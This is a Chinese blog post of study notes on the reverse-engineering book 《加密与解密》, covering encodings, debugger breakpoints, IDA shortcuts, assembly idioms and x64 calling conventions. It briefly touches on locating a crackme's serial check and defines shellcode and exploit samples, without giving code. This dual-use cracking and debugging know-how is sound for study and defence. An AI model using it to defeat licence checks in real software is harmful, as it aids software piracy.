        <content type="html"><![CDATA[<h1 id="《加密与解密》"><a href="#《加密与解密》" class="headerlink" title="《加密与解密》"></a>《加密与解密》</h1><h3 id="1-2-文本字符"><a href="#1-2-文本字符" class="headerlink" title="1.2 文本字符"></a>1.2 文本字符</h3><ul><li>ASCII码是一个7位的编码标准 00h-7Fh</li><li>不同厂商进行了扩充，增加了128个字符，它们在127以上是不统一的 00h-FFh</li><li>例如ANSI、Symbol、OEM等，其中ANSI是系统预设的标准格式</li><li>Unicode 占用两个字节，又叫宽字符集 0-65535</li><li>所有7位ASCII码都被扩充为16位，高位填充0</li><li>例如”pediy”的ACSII码（上）和Unicode码（下）：</li></ul><table><thead><tr><th>70h</th><th>65h</th><th>64h</th><th>69h</th><th>79h</th></tr></thead><tbody><tr><td><strong>0070h</strong></td><td><strong>0065h</strong></td><td><strong>0064h</strong></td><td><strong>0069h</strong></td><td><strong>0079h</strong></td></tr></tbody></table><ul><li>在内存中按小端序(Little-endian)存放</li></ul><table><thead><tr><th>低</th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th></th><th>高</th></tr></thead><tbody><tr><td>70</td><td>00</td><td>65</td><td>00</td><td>64</td><td>00</td><td>69</td><td>00</td><td>79</td><td>00</td></tr></tbody></table><h3 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h3><h5 id="大端序-Big-endian"><a href="#大端序-Big-endian" class="headerlink" title="大端序(Big-endian)"></a>大端序(Big-endian)</h5><ul><li>高字节存入低地址，低字节存入高地址</li></ul><h5 id="小端序-Little-endian"><a href="#小端序-Little-endian" class="headerlink" title="小端序(Little-endian)"></a>小端序(Little-endian)</h5><ul><li>低字节存入低地址，高字节存入高地址</li></ul><p><strong>例：将12345678h写入1000h开始的内存</strong></p><table><thead><tr><th>Big-endian</th><th></th><th>Little-endian</th><th></th></tr></thead><tbody><tr><td>12h</td><td>1000h</td><td>78h</td><td>1000h</td></tr><tr><td>34h</td><td>1001h</td><td>56h</td><td>1001h</td></tr><tr><td>56h</td><td>1002h</td><td>34h</td><td>1002h</td></tr><tr><td>78h</td><td>1003h</td><td>12h</td><td>1003h</td></tr><tr><td>……</td><td>1004h</td><td>……</td><td>1004h</td></tr></tbody></table><p>一般来说，x86系列CPU都是Little-endian；PowerPC通常是Big-endian</p><h3 id="1-3-1-Win32-API函数"><a href="#1-3-1-Win32-API函数" class="headerlink" title="1.3.1 Win32 API函数"></a>1.3.1 Win32 API函数</h3><ul><li>API(Application Programming Interface)应用程序编程接口</li><li>API函数提供应用程序运行所需要的窗口管理，图形设备接口、内存管理等服务功能</li><li>Win API子系统负责将API调用转换成Windows操作系统的系统服务调用</li></ul><p><img src="API.png" alt="API"></p><ul><li>在Win32 API函数字符集中，”A”表示ANSI，”W”表示Widechars（即Unicode）</li><li>例如MessgaeBox函数有两个入口：”MessageBoxA”（ANSI版）和”MessageBoxW”（宽字符版）</li></ul><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><h3 id="分析TraceMe-exe"><a href="#分析TraceMe-exe" class="headerlink" title="分析TraceMe.exe"></a>分析TraceMe.exe</h3><ul><li>右键—查找—当前模块中的名称（标签）或直接Ctrl+N获取TraceMe.exe的API名称表</li><li>获取文本框中的文本一般使用GetWindowText或GetDlgItemText函数，找到GetDlgItemTextA函数后设置断点。</li><li>开始调试分析，可以看出程序调用了两次该函数（获取用户名和序列号）</li><li>之后有两次判断（判断用户名长度）</li><li>最后调用了一个函数（计算序列号）并判断结果</li></ul><pre class="line-numbers language-assembly"><code class="language-assembly">lea        eax,[esp+A0]    ;将esp+A0存入eax中（作为一个地址）imul    edx,ebx            ;edx=edx*ebx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>寄存器ZF（即Z）可控制是否跳转</strong></p><p>参考网页：</p><p><a href="https://blog.csdn.net/lw001x/article/details/7694626（汇编lea指令）" target="_blank" rel="noopener">https://blog.csdn.net/lw001x/article/details/7694626（汇编lea指令）</a></p><p><a href="https://blog.csdn.net/qingshenxue/article/details/6210169（汇编imul指令）" target="_blank" rel="noopener">https://blog.csdn.net/qingshenxue/article/details/6210169（汇编imul指令）</a></p><h3 id="2-1-4-常用断点"><a href="#2-1-4-常用断点" class="headerlink" title="2.1.4 常用断点"></a>2.1.4 常用断点</h3><p>INT3断点、硬件断点、内存断点、消息断点等</p><h5 id="1、INT3断点"><a href="#1、INT3断点" class="headerlink" title="1、INT3断点"></a>1、INT3断点</h5><ul><li>本质是将断点处的地址用”CC”替换</li><li>F2设置的就是这种断点</li><li>优点是可以设置无数个，缺点是改变了原程序机器码</li><li>一些软件会检测API首地址是否为0xCC</li></ul><h5 id="2、硬件断点"><a href="#2、硬件断点" class="headerlink" title="2、硬件断点"></a>2、硬件断点</h5><ul><li>与DRx调试器有关(DR0-DR7)</li><li>使用DR0-DR3设定地址，使用DR7设定状态，最多4个</li><li>设断点：右键—断点—硬件执行</li><li>删断点：调试—硬件断点</li></ul><h5 id="3、内存断点"><a href="#3、内存断点" class="headerlink" title="3、内存断点"></a>3、内存断点</h5><ul><li>内存访问断点/内存写入断点，对所设地址赋予不可访问/不可写属性</li><li>会降低执行速度，因此只允许下1个</li><li>设断点：右键—断点—内存写入</li><li>删断点：右键—断点—删除内存断点</li><li>硬件断点可以实现相同效果：右键—断点—硬件写入—Dword （但会在下一条指令处断）</li></ul><h5 id="4、内存访问一次性断点"><a href="#4、内存访问一次性断点" class="headerlink" title="4、内存访问一次性断点"></a>4、内存访问一次性断点</h5><ul><li>按Alt+M显示内存，在相应段上右键—在访问上设置断点（或直接F2）</li><li>是一次性的断点</li></ul><h5 id="5、消息断点"><a href="#5、消息断点" class="headerlink" title="5、消息断点"></a>5、消息断点</h5><ul><li>某个特定窗口函数接收到某个特定消息时，程序中断</li><li>只有在窗口被创建之后才能设置</li><li>查看—窗口 或工具栏W按钮，如果没有内容就刷新</li><li>右键—在ClassProc上设置消息断点—选择消息种类</li><li>成功中断后，处于系统底层代码中，Alt+F9和Ctrl+F9没用</li><li>Alt+M，对”.text”区块下内存访问断点(F2)再F9就回到了程序中，这里是消息循环处</li><li>Alt+B进入断点窗口可将其删除</li></ul><h5 id="6、条件断点"><a href="#6、条件断点" class="headerlink" title="6、条件断点"></a>6、条件断点</h5><ul><li>带有条件表达式的INT3断点</li></ul><p><strong>按寄存器条件中断</strong></p><ul><li>在下断点处按Shift+F2，输入表达式</li></ul><p><strong>按存储器条件中断</strong></p><ul><li>在函数第一行按Shift+F2，输入[STRING[esp+4]]==”xxx”</li><li>STRING前缀：以零结尾的ASCII字符串（是Unicode的话把”STRING”改为”UNICODE”）</li><li>[esp+4]是第一个参数的内存地址</li></ul><h5 id="7、条件记录断点"><a href="#7、条件记录断点" class="headerlink" title="7、条件记录断点"></a>7、条件记录断点</h5><ul><li>具有条件断点的作用，还能记录断点处函数表达式或参数的值</li><li>也可以设置通过断点的次数</li><li>在函数第1行按Shift+F4</li><li>“条件”输入要设置的表达式</li><li>“说明”设置一个名称</li><li>“表达式”要记录的内容</li><li>下边的文本框可以输入指令，如”.d esp”（注意指令前有”.”），断下时会执行”d esp”，可以在数据窗口中看到esp地址处的数据</li></ul><h3 id="栈窗口查看相对地址"><a href="#栈窗口查看相对地址" class="headerlink" title="栈窗口查看相对地址"></a>栈窗口查看相对地址</h3><p>在栈窗口右键—地址—相对于ESP/EBP</p><h3 id="2-1-6-Run-trace"><a href="#2-1-6-Run-trace" class="headerlink" title="2.1.6 Run trace"></a>2.1.6 Run trace</h3><ul><li>可以把被调试程序执行过的指令保存下来</li><li>调试—打开或清除Run跟踪（运行Run trace）</li><li>查看—Run跟踪（打开Run trace窗口）</li></ul><h3 id="2-1-7-Hit-trace"><a href="#2-1-7-Hit-trace" class="headerlink" title="2.1.7 Hit trace"></a>2.1.7 Hit trace</h3><ul><li>能够让调试者辨别那一部分代码被执行了，哪一部分没有</li></ul><h3 id="2-1-10-常见问题"><a href="#2-1-10-常见问题" class="headerlink" title="2.1.10 常见问题"></a>2.1.10 常见问题</h3><p><strong>1 乱码问题</strong></p><ul><li>将代码当成了数据，没有进行反汇编识别</li><li>右键—分析—分析代码 或 Ctrl+A</li><li>如果还是无法识别：右键—分析—从模块中删除分析 或 在UDD目录中删除相应的UDD文件</li></ul><p><strong>2 快速回到当前程序领空</strong></p><ul><li>翻页到了其他地方</li><li>双击寄存器面板中的EIP 或 单击”C”按钮</li></ul><p><strong>3 修改EIP</strong></p><ul><li>光标移到要修改的地址，右键—在此处新建EIP 或 Ctrl+*</li></ul><p><strong>4  UDD</strong></p><p><strong>5 删除了的断点，OllyDbg重新加载时又出现</strong></p><ul><li>将配置文件ollydbg.ini中的相应内容改成”Backup UDD files=1”</li></ul><p><strong>6 在反汇编窗口输入”push E000”会提示未知标识符</strong></p><ul><li>不能识别E是字母还是数字</li><li>在前面加一个0，即”push 0E000”</li></ul><p><strong>7 OllyDbg出现“假死”现象</strong></p><ul><li>调试加壳程序，运行到断点时出现“假死”现象</li><li>打开配置文件ollydbg.ini，如果”Restore windows”是一个很大的值，就设置”Restore windows 0”</li></ul><p><strong>8 微调窗口显示</strong></p><ul><li>“Ctrl+↑”或”Ctrl+↓”</li></ul><p><strong>9 执行复制到可执行文件时错误</strong></p><p><strong>10 把call调用改成函数名的形式</strong></p><ul><li>例如”call 401496”，401496h处是amsg_exit函数</li><li>将光标停在该处，按”Shift+;”，在弹出的标签框中输入”amsg_exit”</li><li>所有调用401496h处的call指令都会变成”call <amsg_exit>“</amsg_exit></li></ul><h3 id="3-1-文件类型分析"><a href="#3-1-文件类型分析" class="headerlink" title="3.1 文件类型分析"></a>3.1 文件类型分析</h3><ul><li>PEiD、Exeinfo等文件分析工具</li></ul><h3 id="一些快捷键"><a href="#一些快捷键" class="headerlink" title="一些快捷键"></a>一些快捷键</h3><table><thead><tr><th>快捷键</th><th align="left">含义</th></tr></thead><tbody><tr><td>Ctrl+滚轮</td><td align="left">在图形界面调整图形大小</td></tr><tr><td>G</td><td align="left">打开”Jump to address”窗口</td></tr><tr><td>Esc</td><td align="left">后退</td></tr><tr><td>Ctrl+Enter</td><td align="left">前进</td></tr><tr><td>X</td><td align="left">打开交叉参考窗口</td></tr><tr><td>N</td><td align="left">打开更名对话框</td></tr><tr><td>Ctrl+M</td><td align="left">跳转到标记位置（Jump→Mark position 标记当前位置）</td></tr><tr><td>C</td><td align="left">将某段十六进制数据定义为指令</td></tr><tr><td>P</td><td align="left">将某段代码定义为子程序</td></tr><tr><td>U</td><td align="left">取消</td></tr><tr><td>D</td><td align="left">数据类型在db,dw,dd之间转换（Options→Setup data types 设置更多数据类型）</td></tr><tr><td>A</td><td align="left">将某段十六进制数据定义为C语言字符串（Options→ASCII string style 设置更多字符串种类）</td></tr><tr><td>Shift+F11</td><td align="left">打开加载类型库窗口</td></tr><tr><td>T</td><td align="left">重新定义结构体数据</td></tr></tbody></table><p>有些程序可能对一部分程序进行了加密，运行时需要先将其解密。例如有一个函数的内容经过了加密，另一个函数的功能就是对其进行解密，那么在调用该函数前要先调用解密函数。</p><h3 id="一些快捷键-1"><a href="#一些快捷键-1" class="headerlink" title="一些快捷键"></a>一些快捷键</h3><p><strong>IDA也可以动态调试</strong></p><table><thead><tr><th>快捷键</th><th>功能</th></tr></thead><tbody><tr><td>F7</td><td>单步步进</td></tr><tr><td>F8</td><td>单步步过</td></tr><tr><td>F4</td><td>运行到光标所在行</td></tr><tr><td>Ctrl+F7</td><td>运行到该函数返回</td></tr><tr><td>F9</td><td>运行</td></tr><tr><td>Ctrl+F2</td><td>终止一个正在运行的进程</td></tr><tr><td>F2</td><td>设置断点</td></tr></tbody></table><h3 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h3><h3 id="修改程序"><a href="#修改程序" class="headerlink" title="修改程序"></a>修改程序</h3><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><h3 id="启动函数"><a href="#启动函数" class="headerlink" title="启动函数"></a>启动函数</h3><p>启动代码执行完后才调用WinMain函数</p><h3 id="函数的参数"><a href="#函数的参数" class="headerlink" title="函数的参数"></a>函数的参数</h3><p>利用栈传递、利用寄存器传递、通过全局变量进行隐含参数传递</p><h3 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h3><ul><li>一般放在eax寄存器中</li><li>如果大小超过eax寄存器的容量，高32位放到edx寄存器中</li><li>除直接传值外还可以传引用</li></ul><h3 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h3><ul><li>函数内部定义的变量</li><li>用sub esp,8为局部变量分配空间</li><li>函数退出时用add esp,8平衡栈</li><li>也可以用push ecx和pop ecx来替代sub esp,8和add esp,8</li></ul><p><img src="%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F.png" alt="局部变量"></p><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><ul><li>存放在全局变量的内存区中</li><li>常数一般放在全局变量中</li><li>通常位于数据区块(.data)的一个固定地址处</li><li>一般编译器会将全局变量放到可读写区块中，如果放到只读区块中就是一个常量</li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p><img src="%E6%95%B0%E7%BB%84.png" alt="数组"></p><h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><ul><li>虚函数是程序运行时定义的函数</li><li>虚函数的地址不能在编译时确定，只能在调用即将进行时确定</li></ul><h3 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h3><p>一个数组，存放虚函数的地址</p><h3 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h3><p><strong>cmp oprd1,oprd2</strong> 用前一个减后一个，但不影响这两个值</p><table><thead><tr><th>标志位</th><th>结果</th></tr></thead><tbody><tr><td>ZF=1</td><td>两个数相等（结果为零时ZF=1）</td></tr><tr><td><strong>无符号时</strong></td><td></td></tr><tr><td>CF=1</td><td>有借位  oprd1&lt;oprd2</td></tr><tr><td>CF=0</td><td>无借位  oprd1&gt;oprd2</td></tr><tr><td><strong>有符号时</strong></td><td></td></tr><tr><td>SF=0    OF=0</td><td>值为正数  oprd1&gt;oprd2</td></tr><tr><td>SF=1    OF=0</td><td>值为负数  oprd1&lt;oprd2</td></tr><tr><td>SF=0    OF=1</td><td>值为正数，有溢出  oprd1&lt;oprd2</td></tr><tr><td>SF=1    OF=1</td><td>值为负数，有溢出  oprd1&gt;oprd2</td></tr></tbody></table><p> 转移指令的条件与机器码</p><table><thead><tr><th>转移类别</th><th>标志位</th><th>含义</th><th>短转移机器码</th><th>长转移机器码</th></tr></thead><tbody><tr><td>CALL</td><td>–</td><td>call调用指令</td><td>E8xxxxxxxx</td><td>E8xxxxxxxx</td></tr><tr><td>JMP</td><td>–</td><td>无条件转移</td><td>EBxx</td><td>E9xxxxxxxx</td></tr><tr><td>JO</td><td>OF=1</td><td>溢出</td><td>70xx</td><td>0F80xxxxxxxx</td></tr><tr><td>JNO</td><td>OF=0</td><td>无溢出</td><td>71xx</td><td>0F81xxxxxxxx</td></tr><tr><td>JB/JC/JNAE</td><td>CF=1</td><td>低于/进位/不高于等于</td><td>72xx</td><td>0F82xxxxxxxx</td></tr><tr><td>JNB/JNC/JAE</td><td>CF=0</td><td>不低于/无进位/高于等于</td><td>73xx</td><td>0F83xxxxxxxx</td></tr><tr><td>JE/JZ</td><td>ZF=1</td><td>相等/等于零</td><td>74xx</td><td>0F84xxxxxxxx</td></tr><tr><td>JNE/JNZ</td><td>ZF=0</td><td>不相等/不等于零</td><td>75xx</td><td>0F85xxxxxxxx</td></tr><tr><td>JBE/JNA</td><td>CF=1或ZF=1</td><td>低于等于/不高于</td><td>76xx</td><td>0F86xxxxxxxx</td></tr><tr><td>JNBE/JA</td><td>CF=0且ZF=0</td><td>不低于等于/高于</td><td>77xx</td><td>0F87xxxxxxxx</td></tr><tr><td>JS</td><td>SF=1</td><td>符号为负</td><td>78xx</td><td>0F88xxxxxxxx</td></tr><tr><td>JNS</td><td>SF=0</td><td>符号为正</td><td>79xx</td><td>0F89xxxxxxxx</td></tr><tr><td>JP/JPE</td><td>PF=1</td><td>“1”的个数为偶数</td><td>7Axx</td><td>0F8Axxxxxxxx</td></tr><tr><td>JNP/JPO</td><td>PF=0</td><td>“1”的个数为奇数</td><td>7Bxx</td><td>0F8Bxxxxxxxx</td></tr><tr><td>JL/JNGE</td><td>SF!=OF</td><td>小于/不大于等于</td><td>7Cxx</td><td>0F8Cxxxxxxxx</td></tr><tr><td>JNL/JGE</td><td>SF=OF</td><td>不小于/大于等于</td><td>7Dxx</td><td>0F8Dxxxxxxxx</td></tr><tr><td>JLE/JNG</td><td>SF!=OF或ZF=1</td><td>小于等于/不大于</td><td>7Exx</td><td>0F8Exxxxxxxx</td></tr><tr><td>JNLE/JG</td><td>SF=OF且ZF=0</td><td>不小于等于/大于</td><td>7Fxx</td><td>0F8Fxxxxxxxx</td></tr></tbody></table><h3 id="条件设置指令"><a href="#条件设置指令" class="headerlink" title="条件设置指令"></a>条件设置指令</h3><ul><li>形式是SETcc  r/m8</li><li>其中r/m8表示8位寄存器或单字节内存单元</li><li>条件设置指令根据处理器定义的16种条件测试一些标志位，条件满足时，目标操作数置1，否则置0</li><li>条件与转移指令相同</li></ul><h3 id="利用算数操作替代转移指令"><a href="#利用算数操作替代转移指令" class="headerlink" title="利用算数操作替代转移指令"></a>利用算数操作替代转移指令</h3><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>与其他分支语句最大的区别在于是向后跳转的</p><h3 id="用lea指令代替add和sub"><a href="#用lea指令代替add和sub" class="headerlink" title="用lea指令代替add和sub"></a>用lea指令代替add和sub</h3><pre class="line-numbers language-assembly"><code class="language-assembly">lea        edx,dword ptr[ecx+eax+78]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>只有在都是寄存器的情况下才有效</li><li>寄存器在前面，常数在后面</li></ul><h3 id="计算乘法若有一个乘数是2的幂则会用左移"><a href="#计算乘法若有一个乘数是2的幂则会用左移" class="headerlink" title="计算乘法若有一个乘数是2的幂则会用左移"></a>计算乘法若有一个乘数是2的幂则会用左移</h3><p>例如eax*5可以写成</p><pre class="line-numbers language-assembly"><code class="language-assembly">lea        eax,[eax+4*eax]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="除法用乘法代替"><a href="#除法用乘法代替" class="headerlink" title="除法用乘法代替"></a>除法用乘法代替</h3><h3 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h3><p><strong>1、C字符串：以”\0”为结束标志</strong></p><p>​            P    E    D    I    Y    \0</p><p><strong>2、DOS字符串：以”$”为结束标志</strong></p><p>​            P    E    D    I    Y    $</p><p><strong>3、PASCAL字符串：无终止符，但在开头定义长度</strong></p><p>不超过255个字符</p><p>​            5    P    E    D    I    Y</p><p><strong>4、Delphi字符串</strong></p><p>双字节Delphi字符串：表示长度的字段扩展为2字节</p><p>不超过255个字符</p><p>​            5    0    P    E    D    I    Y</p><p>四字节Delphi字符串：表示长度的字段扩展为4字节</p><p>长度达到4GB</p><h3 id="字符寻址指令"><a href="#字符寻址指令" class="headerlink" title="字符寻址指令"></a>字符寻址指令</h3><pre class="line-numbers language-assembly"><code class="language-assembly">mov        eax,[401000h]        ;直接寻址，把地址为00401000h的数据放入eaxmov        eax,[ecx]            ;寄存器间接寻址，把ecx中的地址所指的内容放入eaxlea        eax,[401000h]        ;装入有效地址(Load Effective Address)，将401000h写入eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>计算索引和常量的和时，一般将指针放在第一个，例如</p><pre class="line-numbers language-assembly"><code class="language-assembly">mov        dword ptr[eax+b],67452301<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="字母大小写转换"><a href="#字母大小写转换" class="headerlink" title="字母大小写转换"></a>字母大小写转换</h3><p>大写字母  41h-5Ah</p><p>小写字母  61h-7Ah</p><p>转换方式就是将原ASCII码加/减20h</p><h3 id="指令修改"><a href="#指令修改" class="headerlink" title="指令修改"></a>指令修改</h3><p>见P131表格</p><p>因为很多指令针对eax寄存器进行了优化，所以尽量使用eax寄存器</p><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><ul><li>x64系统通用寄存器的名称，第一个字母从E变为R</li><li>大小扩展到64位</li><li>数量增加了8个(R8-R15)</li><li>与x86下的32位寄存器兼容，例如：RAX(64位)、EAX(低32位)</li><li>使用DWORD、WORD、BYTE后缀，例如：R8(64位)、R8D(低32位)、R8W(低16位)、R8B(低8位)</li></ul><h3 id="栈平衡"><a href="#栈平衡" class="headerlink" title="栈平衡"></a>栈平衡</h3><p>函数调用完成时，要保证栈顶与函数调用前的位置一致</p><h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><ul><li>前四个参数使用寄存器传递，多余的参数放在栈中</li><li>入栈顺序为从右到左</li><li>由调用方平衡栈</li><li>第一个参数RCX，第二个参数RDX，第三个参数R8，第四个参数R9</li><li>大于8字节或不是1、2、4、8字节的参数由引用传递</li><li>浮点参数由XMM寄存器完成传递(XMM0-XMM3)</li><li>栈仍然为这4个参数预留了空间，当函数寄存器不够用时，可以把寄存器的值保存到栈空间中</li></ul><p><strong>参数为结构体且小于8字节</strong></p><ul><li>把整个结构体的内容放在寄存器中</li><li>在函数中通过访问高32位和低32位来分别访问结构体成员</li></ul><p><strong>参数为结构体且大于8字节</strong></p><ul><li>把内容复制到栈中，再把结构体地址作为参数</li><li>在函数中通过“结构体地址+偏移”的方式访问结构体内容</li></ul><p><strong>thiscall传递</strong></p><ul><li>类的成员函数调用、参数传递方式与普通函数没有很大区别</li><li>会银行的传递一个this指针参数</li></ul><p><strong>返回值</strong></p><ul><li>用RAX寄存器来保存</li><li>大于8字节时可以用地址</li></ul><h3 id="局部变量-1"><a href="#局部变量-1" class="headerlink" title="局部变量"></a>局部变量</h3><ul><li>与32位基本相同</li><li>编译为Release版本时，编译器会尽可能用寄存器来存放局部变量</li></ul><h3 id="全局变量-1"><a href="#全局变量-1" class="headerlink" title="全局变量"></a>全局变量</h3><ul><li>同32位</li></ul><h3 id="数组-1"><a href="#数组-1" class="headerlink" title="数组"></a>数组</h3><p>占用内存大小为：sizeof(类型)*个数</p><p><strong>数组寻址公式</strong></p><p>数组元素地址=数组首地址+sizeof(数组类型)*下标</p><p><strong>多维数组可以看作是元素类型为数组的一维数组</strong></p><p>[数组首地址+n]</p><p>[数组首地址+寄存器*n]</p><p><strong>如果遇到以上特征，就可以怀疑为一个数组访问</strong></p><h3 id="条件控制语句"><a href="#条件控制语句" class="headerlink" title="条件控制语句"></a>条件控制语句</h3><p>虚线箭头表示条件跳转</p><p>实线箭头表示无条件跳转</p><p><img src="%E6%9D%A1%E4%BB%B6%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5.jpg" alt="条件控制语句"></p><p><strong>switch-case</strong></p><ul><li>分支数小于6时直接用if……else语句来实现</li><li>分支数大于等于6时会进行优化</li><li>有case表和判定树两种优化方式</li></ul><p><strong>判定表</strong></p><table><thead><tr><th>数组下标</th><th>数组内容</th></tr></thead><tbody><tr><td>0</td><td>case1 语句块代码偏移</td></tr><tr><td>1</td><td>case2 语句块代码偏移</td></tr><tr><td>2</td><td>case3 语句块代码偏移</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p><strong>判定树</strong></p><p><img src="%E5%88%A4%E5%AE%9A%E6%A0%91.png" alt="判定树"></p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>循环语句与if语句最大的区别就是有向上（后）跳转</p><p><strong>1、do…while循环</strong></p><p><img src="do_while.jpg" alt="do_while"></p><p>不用取反即可还原do…while循环代码</p><p><strong>2、while循环</strong></p><p><img src="while.jpg" alt="while"></p><p>把jxx取反即可还原</p><p><strong>3、for循环</strong></p><p><img src="for.jpg" alt="for"></p><p>把jxx取反即可还原</p><h3 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h3><p>主要讨论Release版本中编译器优化后的四则运算</p><p><strong>1、加法和减法</strong></p><ul><li>使用lea指令，例如</li></ul><pre class="line-numbers language-assembly"><code class="language-assembly">lea        edx,[rcx+3]lea        edx,[rbx-5]lea        edx,[rbx+rbx+4]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>寄存器在前，常数在后</li><li>若有多个常数，则在编译期间计算好结果（常量折叠）</li></ul><p><strong>2、乘法</strong></p><ul><li>分为有符号(imul)和无符号(mul)两种</li><li>通常使用lea比例因子寻址来优化指令，例</li></ul><pre class="line-numbers language-assembly"><code class="language-assembly">lea        edx,ds:0[rcx*4]lea        edx,[rbx+rbx*8]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>3、除法</strong></p><p>分为六种情况：</p><ol><li>有符号，除数为2^n</li><li>有符号，除数为-2^n</li><li>有符号，除数为正，非2^n</li><li>有符号，除数为负，非2^n</li><li>无符号，除数为2^n</li><li>无符号，除数非2^n</li></ol><p>除数为2^n时很简单</p><p>除数非2^n时较复杂，并没有完全弄懂</p><p><strong>4、整数的取模</strong></p><p><strong>除数为2^n</strong></p><p>优化公式1：</p><p>x&gt;=0: x%2^n=x&amp;(2^n-1)</p><p>x&lt;0: (x&amp;(2^n-1))-1|(~(2^n-1))+1</p><p>优化公式2：</p><p>x&gt;=0: x%2^n=x&amp;(2^n-1)</p><p>x&lt;0: ((x+(2^n-1))&amp;(2^n-1))-(2^n-1)</p><p><strong>除数非2^n</strong></p><p>一般采用： 余数=被除数-商*除数</p><h3 id="虚函数-1"><a href="#虚函数-1" class="headerlink" title="虚函数"></a>虚函数</h3><ul><li>如果一个类至少有一个虚函数，这个类就有一个指向虚表的指针</li><li>不同的类虚表不同，相同的类对象共享一个虚表</li><li>虚表指针存放在对象首地址处</li></ul><p><img src="%E8%99%9A%E8%A1%A8.jpg" alt="虚表"></p><h3 id="菱形继承"><a href="#菱形继承" class="headerlink" title="菱形继承"></a>菱形继承</h3><ul><li>两个子类继承同一个父类，又有子类同时继承这两个子类</li><li>一般使用虚函数继承</li><li>如果发现构造函数的参数多传递了一个，就可以怀疑这个类继承层次带有虚继承</li><li>如果是虚继承，就不再与基类共享一个虚表，会增加一个虚表</li></ul><p><img src="%E8%8F%B1%E5%BD%A2%E7%BB%A7%E6%89%BF1.jpg" alt="菱形继承1"></p><p><img src="%E8%8F%B1%E5%BD%A2%E7%BB%A7%E6%89%BF2.jpg" alt="菱形继承2"></p><h3 id="抽象类虚表"><a href="#抽象类虚表" class="headerlink" title="抽象类虚表"></a>抽象类虚表</h3><ul><li>含有纯虚函数的类称为抽象类</li><li>抽象类虚函数的最大特点是没有实现代码</li><li>父类为抽象类的实现代码与单重继承没有太大区别</li><li>唯一的区别在于虚表</li><li>由于纯虚函数没有实现代码，编译器默认填充了_purecall函数的地址</li><li>_purecall函数的功能就是显示一个错误信息并退出程序</li><li>_purecall函数可以作为识别抽象类的一个依据</li></ul><h3 id="第14章-漏洞分析技术"><a href="#第14章-漏洞分析技术" class="headerlink" title="第14章 漏洞分析技术"></a>第14章 漏洞分析技术</h3><p>缓冲区溢出、UAF(Use-After-Free)等涉及二进制编码的漏洞统称为二进制漏洞</p><p>本章部分内容放到对应的部分单独讲</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>一段可以独立执行的代码</p><p><img src="shellcode.jpg" alt="shellcode"></p><h3 id="漏洞样本"><a href="#漏洞样本" class="headerlink" title="漏洞样本"></a>漏洞样本</h3><p>一般分为两类：一类是证明软件有漏洞，叫PoC(Proof of Concept)；另一类是漏洞利用样本，叫做Exp(Exploit)</p><p>主要讨论Exp</p><p><strong>1、可执行文件</strong></p><p>直接利用exe程序触发漏洞的执行，从而实现提权或远程溢出的目的</p><p><strong>2、文档类</strong></p><p>没有执行的功能，当存在漏洞的应用程序打开此类样本时，会触发应用程序漏洞，实现执行shellcode的目的</p><ul><li>浏览器类：*.html *.htm 等，主要用于触发浏览器漏洞</li><li>办公文档类：*.pdf *.doc *.rtf *.xls *.ppt *.pps *.mdb等，主要用于触发Office系列应用程序漏洞</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 《加密与解密》 </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2020/01/03/zhan-qian-yi/"/>
      <url>/2020/01/03/zhan-qian-yi/</url>
      
